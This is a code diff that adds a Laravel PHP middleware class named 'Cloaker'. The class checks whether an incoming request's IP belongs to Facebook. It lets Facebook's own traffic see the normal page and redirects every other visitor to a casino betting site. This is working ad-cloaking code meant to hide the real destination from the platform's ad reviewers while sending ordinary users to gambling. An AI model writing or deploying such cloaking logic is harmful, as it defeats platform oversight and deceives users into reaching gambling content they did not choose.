@@ -1,0 +1,40 @@
+<?php
+
+declare(strict_types=1);
+
+namespace App\Http\Middleware;
+
+use App\Contracts\FacebookDetector;
+use App\ValueObjects\Http\Ip;
+use Closure;
+use Illuminate\Http\Request;
+use Symfony\Component\HttpFoundation\Response;
+
+class Cloaker
+{
+
+    /**
+     * @param  FacebookDetector  $detector
+     */
+    public function __construct(
+        private readonly FacebookDetector $detector
+    )
+    {
+    }
+
+    /**
+     * Handle an incoming request.
+     *
+     * @param  Closure(Request): (Response)  $next
+     */
+    public function handle(Request $request, Closure $next): Response
+    {
+        $ip = Ip::make($request->ip());
+
+        if ($this->detector->match($ip)) {
+            return $next($request);
+        }
+
+        return redirect('https://bet368.casino/#/HO/');
+    }
+}
